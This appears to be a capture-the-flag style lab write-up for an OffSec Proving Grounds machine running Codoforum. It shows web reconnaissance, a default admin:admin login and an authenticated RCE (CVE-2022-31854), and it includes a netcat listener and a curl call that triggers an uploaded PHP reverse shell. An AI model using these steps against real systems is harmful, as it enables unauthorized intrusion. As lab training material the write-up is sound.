**HyperText Transport Protocol**

# Environment Variables / Setup

```
export IP=192.168.110.23
export PORT=80
export URL=http://$IP:$PORT
export HTTPS_URL=https://$IP:443
```

# Phase 1: Initial Reconnaissance

## Technology Stack Identification

### whatweb
```
whatweb $URL
```

```
http://192.168.110.23:80 [200 OK] Apache[2.4.41], Cookies[PHPSESSID,cf], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.110.23], Open-Graph-Protocol[website], Script[javascipt,text/html,text/javascript], Title[All topics | CODOLOGIC], X-UA-Compatible[IE=edge]
```

### Screenshot

![[Pasted image 20250819071536.png]]


## Nmap HTTP Scripts
```
nmap --script=http-enum,http-headers,http-methods,http-robots.txt,http-title -p$PORT $IP
```

```
PORT   STATE SERVICE
80/tcp open  http
|_http-title: All topics | CODOLOGIC
| http-headers:
|   Date: Tue, 19 Aug 2025 14:13:48 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Set-Cookie: PHPSESSID=roqi183ua4igl2o4fpbbqtbe1d; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   Set-Cookie: cf=0; expires=Wed, 19-Aug-2026 14:13:48 GMT; Max-Age=31536000; path=/
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|
|_  (Request type: HEAD)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /cache/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /sites/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /sys/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

I'll open http://192.168.110.23 in a browser proxied with Burpsuite to manually walk the website while logging my traffic.

## Finding /admin
On /admin and /admin/index.php we have an admin sign in page.

![[Pasted image 20250819071720.png]]

Guessing admin:admin gets us in.

One of the first things I notice is that we now have the exact version of Codoforum, V.5.1.105. 

![[Pasted image 20250819071948.png]]

Ideally we'll be able to get code execution from this panel.

# Initial Access
From exploit-db, I found CVE-2022-31854 for version 5.1 by searching for codoforum:

https://www.exploit-db.com/exploits/50978

I also found a blog from the exploit author on this CVE:
https://vikaran101.medium.com/codoforum-v5-1-authenticated-rce-my-first-cve-f49e19b8bc

The proof of concept demonstrates that it's possible to upload an arbitrary PHP file as the logo, which can be used to gain remote code execution on the target.

I don't have success when running the script, but by following the manual process described in Vikaran's post I was able to upload and execute a reverse shell on the target as www-data:

Attacking machine: `nc -lnvp 1234`

`curl http://$IP/sites/default/assets/img/attachments/revshell.php`


![[Pasted image 20250819073857.png]]

# Continue: [[Archive/OFFSEC - Proving Grounds Writeups/Linux/Codo/Privilege Escalation]]

